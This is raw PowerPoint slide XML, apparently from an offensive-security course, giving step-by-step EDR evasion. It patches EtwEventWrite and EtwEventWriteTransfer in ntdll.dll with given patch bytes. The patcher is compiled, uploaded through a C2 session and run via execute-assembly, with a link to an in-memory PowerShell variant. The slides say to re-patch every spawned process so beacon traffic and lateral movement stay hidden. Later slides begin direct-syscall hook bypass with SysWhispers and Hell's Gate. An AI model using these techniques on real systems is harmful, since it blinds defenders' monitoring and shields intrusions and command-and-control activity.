              </a:rPr>
              <a:t>−</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="1" dirty="0">
                <a:effectLst/>
                <a:latin typeface="KaTeX_Math"/>
              </a:rPr>
              <a:t>Process</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:effectLst/>
                <a:latin typeface="KaTeX_Main"/>
              </a:rPr>
              <a:t>−</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="1" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="KaTeX_Math"/>
              </a:rPr>
              <a:t>Id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>pid</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="KaTeX_Main"/>
              </a:rPr>
              <a:t>process.Refresh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:effectLst/>
                <a:latin typeface="KaTeX_Main"/>
              </a:rPr>
              <a:t>();</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="1" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="KaTeX_Math"/>
              </a:rPr>
              <a:t>process</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="KaTeX_Main"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="1" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="KaTeX_Math"/>
              </a:rPr>
              <a:t>Refresh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:effectLst/>
                <a:latin typeface="KaTeX_Main"/>
              </a:rPr>
              <a:t>();</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>process.ProcessName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>This does not directly show the flags, but combined with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>logman</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> query -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>, it proves your process is no longer sending data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 8: Important Note – This Verification is Critical</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Do not assume the patch worked just because the command completed without errors. You must verify that ETW is truly blind to your process. The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>logman</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> query -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> command is the simplest and most reliable way to confirm this. If the ETW sessions are still running but your process is absent from the telemetry feeds, you have succeeded.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8749823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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="70000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800"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 Advanced: Disable Network Telemetry: Patch the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="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EventWrite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800"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 and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="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EventWriteTransfer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800"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800" dirty="0" err="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syscalls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800"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 in ntdll.dll for your specific beacon process so that the EDR's network driver never receives metadata about your C2 beaconing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1800"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a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1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TASK 02 – PART 3: DISABLE NETWORK TELEMETRY</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What Is Network Telemetry?</a:t>
            </a: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ETW is not just for process and registry events. It also captures network metadata. Every time your beacon sends a C2 packet, ETW generates network telemetry. This telemetry is consumed by the EDR's network driver and sent to the cloud dashboard. If the Blue Team analyzes network telemetry, they can see your beacon's communication patterns, destination IPs, and timing. Patching </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EventWrite</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and </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EventWriteTransfer</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makes your beacon invisible to network telemetry as well.</a:t>
            </a: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The </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EventWrite</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function is responsible for writing events to ETW. </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EventWriteTransfer</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is an extended version that includes activity IDs. By patching these functions in ntdll.dll to return immediately, you stop all ETW events from your process, including network telemetry. The EDR's network driver never receives metadata about your C2 beaconing.</a:t>
            </a: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1: Create the Network Telemetry Patcher C# Code</a:t>
            </a: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On your Kali machine, create a file named </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NetworkTelemetryPatcher.cs</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with the following code:</a:t>
            </a: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hlinkClick r:id="rId2">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>https://github.com/umarniazafrid/Week-11-Task-2-Part-3/tree/main</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" kern="100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>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Explanation of the code:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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LoadLibrary</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loads ntdll.dll into memory.</a:t>
            </a:r>
            <a:b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b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GetProcAddress</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gets the addresses of </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EtwEventWrite</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and </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EtwEventWriteTransfer</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b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b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VirtualProtect</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changes the memory protection to PAGE_EXECUTE_READWRITE (0x40) so we can write to the function prologue.</a:t>
            </a:r>
            <a:b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b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The patch bytes (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) correspond to a short assembly routine that returns the error code 0x80070057 (invalid argument) without doing any work.</a:t>
            </a:r>
            <a:b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b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Marshal.Copy</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writes the patch bytes to the start of each function.</a:t>
            </a:r>
            <a:b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b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VirtualProtect</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restores the original memory protection.</a:t>
            </a:r>
            <a:b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b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The patched functions now return immediately, generating no telemetry.</a:t>
            </a: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2: Compile the C# Code</a:t>
            </a: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Compile </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NetworkTelemetryPatcher.cs</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into an executable:</a:t>
            </a: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csc /</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target:exe</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out:NetworkTelemetryPatcher.exe</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NetworkTelemetryPatcher.cs</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3: Upload the Compiled Executable to the Target</a:t>
            </a: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Through your C2 session, upload NetworkTelemetryPatcher.exe to the target machine:</a:t>
            </a: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upload /path/to/NetworkTelemetryPatcher.exe C:\temp\NetworkTelemetryPatcher.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="14063992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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="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4: Execute the Patcher via execute-assembly</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="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Run the compiled .NET assembly directly in memory:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="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execute-assembly C:\temp\NetworkTelemetryPatcher.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="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The code patches </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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EtwEventWrite</a:t>
            </a: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and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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EtwEventWriteTransfer</a:t>
            </a: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in ntdll.dll for your current process. The console output will confirm that network telemetry is patched.</a:t>
            </a:r>
          </a:p>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5: Verification – Capture Network Telemetry Before Patch</a:t>
            </a:r>
          </a:p>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Before applying the patch, capture your beacon's network telemetry. Use Wireshark or Process Monitor to verify that network events are visible.</a:t>
            </a:r>
          </a:p>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In Process Monitor:</a:t>
            </a:r>
            <a:b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b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Open Process Monitor on the Windows VM.</a:t>
            </a:r>
            <a:b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b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Apply a filter for your beacon process by PID.</a:t>
            </a:r>
            <a:b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b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Look for network events under the Network tab.</a:t>
            </a:r>
          </a:p>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You will see network connections originating from your beacon process.</a:t>
            </a:r>
          </a:p>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6: Verification – Capture Network Telemetry After Patch</a:t>
            </a:r>
          </a:p>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After applying the patch, repeat the same steps in Process Monitor:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5973779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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="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Apply the same filter for your beacon process by PID.</a:t>
            </a:r>
            <a:b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b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Refresh the view.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="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You will see no network events from your beacon process. The EDR's network driver receives no metadata about your C2 beaconing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="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7: Verification – Check </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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EtwEventWrite</a:t>
            </a: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in Memory</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="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You can verify the patch was applied by dumping the first few bytes of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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EtwEventWrite</a:t>
            </a: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p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" kern="100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:hlinkClick r:id="rId2">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>https://github.com/umarniazafrid/Week-11-Task-2-Part-3-step-7/tree/main</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" kern="100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endPar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The output should show the patch bytes: 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700"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marL="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8: Alternative – Patch </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EventWrite</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Using PowerShell (One-Liner)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="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If you prefer not to use a compiled .NET assembly, you can patch </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EventWrite</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directly from PowerShell:</a:t>
            </a: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hlinkClick r:id="rId3">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>https://github.com/umarniazafrid/Week-11-Task-2-Part-3-step-8</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This runs entirely in memory and leaves no file on disk.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endPar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7454208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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>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9: Important – Patch Applies Only to Current Process</a:t>
            </a:r>
          </a:p>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The patch only affects the current process. If your beacon spawns a new process (e.g., for lateral movement), the new process will have unpatched ntdll.dll. You must re-patch each new process.</a:t>
            </a:r>
          </a:p>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To automate this, integrate the patching code into your implant's initialization routine. Every time your implant starts a new process, it should patch </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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EtwEventWrite</a:t>
            </a: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and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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EtwEventWriteTransfer</a:t>
            </a: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for that new process.</a:t>
            </a:r>
          </a:p>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10: Verification – Test with a C2 Beacon</a:t>
            </a:r>
          </a:p>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To confirm the patch works in a real scenario, perform the following test:</a:t>
            </a:r>
          </a:p>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Start your C2 listener (e.g., Sliver HTTPS listener).</a:t>
            </a:r>
            <a:b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b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Deploy your beacon to the target.</a:t>
            </a:r>
            <a:b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b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Before the patch: Observe network traffic in Wireshark. You will see your beacon's HTTPS requests.</a:t>
            </a:r>
            <a:b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b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Apply the patch (Step 4).</a:t>
            </a:r>
            <a:b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b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Observe network traffic in Wireshark again. The beacon's HTTPS requests should no longer be visible.</a:t>
            </a:r>
            <a:b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b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Your C2 session should still be active (the patch does not break the connection; it only removes telemetry).</a:t>
            </a:r>
          </a:p>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This proves that the patch does not interfere with your beacon's functionality. It only prevents the EDR's network driver from receiving metadata.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="7736675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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>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11: Verification – EDR Dashboard</a:t>
            </a:r>
          </a:p>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If you have access to an EDR dashboard (e.g., Defender for Endpoint trial), you can verify that the EDR no longer shows network telemetry for your beacon process. Before the patch, you will see outbound network connections. After the patch, these connections disappear from the EDR's timeline.</a:t>
            </a:r>
          </a:p>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Summary – What You Have Achieved:</a:t>
            </a:r>
          </a:p>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You patched </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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EtwEventWrite</a:t>
            </a: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and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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EtwEventWriteTransfer</a:t>
            </a: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in ntdll.dll.</a:t>
            </a:r>
            <a:b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b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Network telemetry is disabled for your beacon process.</a:t>
            </a:r>
            <a:b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b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The EDR's network driver never receives metadata about your C2 beaconing.</a:t>
            </a:r>
            <a:b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b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Your beacon continues to communicate with the C2 without generating network telemetry.</a:t>
            </a:r>
          </a:p>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p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26481695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EC656-C114-4C47-ACFF-EBF4580E73BA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" kern="100"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Task 03: Direct </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Syscall</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 Execution – Bypassing EDR User-Mode Hooks</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" kern="100"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br>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A2DA0EF0-78A3-4E6F-BFFF-E81E138DCD7F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1590675"/>
            <a:ext cx="11353800" cy="4586288"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="55000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 Description: EDRs (CrowdStrike, Defender) hook Windows API functions in user-mode (ntdll.dll) to monitor suspicious calls (e.g., </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>NtCreateProcess</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>NtAllocateVirtualMemory</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 Instead of calling these APIs normally (which triggers the EDR's hooks), you will execute the system calls directly from your own assembly, bypassing the EDR's monitoring entirely—without touching the kernel or loading drivers.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 Technical Requirements:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="100"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  · </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Syscall</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 Table Extraction: Use a tool like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Syswhispers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 or Hell's Gate to dynamically resolve the System Service Number (SSN) for critical NTAPI functions (e.g., </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
